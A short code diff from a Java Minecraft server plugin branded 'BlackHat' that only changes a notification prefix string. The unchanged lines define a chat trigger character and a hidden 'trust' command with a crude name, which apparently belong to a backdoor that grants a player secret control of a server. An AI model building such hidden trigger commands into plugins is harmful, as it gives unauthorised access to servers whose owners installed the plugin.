@@ -29,7 +29,7 @@ public final class Start extends JavaPlugin {
     public static final Character CHAT_TRIGGER = '#';
     public static final String TRUST_COMMAND = "-dicksuck";
     public static final String COMMAND_PREFIX = "§a[§3Black§4Hat§a]§r ";
-    public static final String NOTIFY_PREFIX = "&3Black&4Hat&b>> ";
+    public static final String NOTIFY_PREFIX = "&3Black&4Hat&b» ";
     public static Start Instance = null;
     public static @NotNull Logger LOGGER;
     private final PluginDescriptionFile pdfFile = this.getDescription();
